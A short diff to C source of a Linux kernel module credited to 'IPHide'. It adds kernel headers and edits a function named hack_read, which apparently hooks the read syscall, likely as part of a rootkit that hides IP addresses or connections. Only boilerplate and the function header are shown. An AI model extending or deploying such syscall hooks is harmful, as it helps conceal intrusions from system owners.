@@ -10,6 +10,9 @@
 #include <linux/uaccess.h>
 #include <linux/slab.h>
 #include <linux/limits.h>
+#include <linux/file.h>
+#include <linux/dcache.h>
+#include <linux/path.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("IPHide");
@@ -144,7 +147,6 @@ static asmlinkage long hack_read(const struct pt_regs *regs)
 {
     unsigned int fd = (unsigned int)regs->di;
     char __user *buf = (char __user *)regs->si;
-    size_t count = (size_t)regs->dx;
     long ret;
     char *kbuf;
     struct file *file;
